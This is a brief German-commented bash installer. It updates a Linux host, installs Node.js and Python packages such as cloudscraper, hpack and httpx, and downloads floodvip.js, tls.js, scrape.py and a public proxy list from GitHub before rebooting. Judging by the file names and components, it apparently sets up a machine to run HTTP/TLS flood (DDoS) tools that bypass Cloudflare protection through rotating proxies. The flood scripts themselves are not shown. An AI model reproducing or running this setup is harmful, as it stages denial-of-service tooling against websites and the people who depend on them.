#!/bin/bash

echo "[*] Aktualisiere Paketlisten..."
apt update
apt upgrade -y

echo "[*] Installiere nodejs, dstat und npm..."
apt install -y nodejs dstat npm python3-pip wget

echo "[*] Installiere cloudscraper und request..."
npm install request
npm install cloudscraper
npm i fs
npm i crypto
npm i hex
npm i set-cookie-parser
npm i events
npm i colors
npm i hpack
pip install httpx
pip install colorama

wget https://raw.githubusercontent.com/M220506/1/refs/heads/main/new.js
wget https://raw.githubusercontent.com/M220506/1/refs/heads/main/api_list.txt
wget https://raw.githubusercontent.com/M220506/1/refs/heads/main/scrape.py
wget https://raw.githubusercontent.com/M220506/1/refs/heads/main/tls.js
wget https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/http.txt
wget https://raw.githubusercontent.com/M220506/1/refs/heads/main/floodvip.js
reboot
